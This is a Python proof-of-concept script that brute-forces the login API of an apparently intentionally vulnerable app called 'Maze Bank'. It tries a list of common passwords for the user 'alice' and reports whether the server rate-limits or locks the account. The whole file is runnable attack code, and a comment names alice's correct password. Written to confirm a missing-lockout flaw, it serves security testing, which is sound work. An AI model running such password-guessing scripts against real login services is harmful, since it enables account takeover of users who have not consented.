#!/usr/bin/env python3
"""
PoC: Brute-Force Password Guessing & Audit Logging Evidence
Demonstrates that the login endpoint does not rate-limit or lock accounts on repeated failed attempts,
while populating the `login_attempts` audit log.
"""

import sys
import json
import urllib.request
import urllib.error

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
LOGIN_ENDPOINT = f"{TARGET_URL}/api/auth/login"
TARGET_USERNAME = "alice"

PASSWORDS_TO_TRY = [
    "123456",
    "password",
    "admin",
    "letmein",
    "welcome",
    "pass123" # Correct password for alice
]

def attempt_login(username, password):
    data = json.dumps({"username": username, "password": password}).encode("utf-8")
    req = urllib.request.Request(
        LOGIN_ENDPOINT,
        data=data,
        headers={"Content-Type": "application/json", "User-Agent": "MazeBankBruteForcePoC/1.0"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req) as response:
            res_body = response.read().decode("utf-8")
            return response.status, json.loads(res_body)
    except urllib.error.HTTPError as e:
        error_body = e.read().decode("utf-8")
        try:
            return e.code, json.loads(error_body)
        except Exception:
            return e.code, {"error": error_body}
    except Exception as e:
        return 0, {"error": str(e)}

def main():
    print("=" * 60)
    print("🎯 Maze Bank PoC: Brute Force Password Demonstration")
    print(f"Target:   {LOGIN_ENDPOINT}")
    print(f"Username: {TARGET_USERNAME}")
    print("=" * 60)
    print()

    attempts_count = 0
    success = False

    for pwd in PASSWORDS_TO_TRY:
        attempts_count += 1
        print(f"[*] Attempt #{attempts_count}: Testing password '{pwd}'...")
        status, body = attempt_login(TARGET_USERNAME, pwd)

        if status == 200:
            print(f"  --> ✅ SUCCESS! Found valid password: '{pwd}'")
            print(f"  --> Response: {json.dumps(body)}")
            success = True
            break
        elif status == 401:
            print(f"  --> ❌ Failed (401 Unauthorized - logged to login_attempts audit table)")
        elif status == 429:
            print(f"  --> 🛑 BLOCKED (429 Rate Limit encountered)")
            break
        else:
            print(f"  --> Server returned status {status}: {body}")

    print()
    if success:
        print(f"✅ VULNERABILITY CONFIRMED: Completed {attempts_count} requests with no lockout/rate-limiting.")
    else:
        print("[-] Brute-force run finished without finding match or blocked.")

if __name__ == "__main__":
    main()
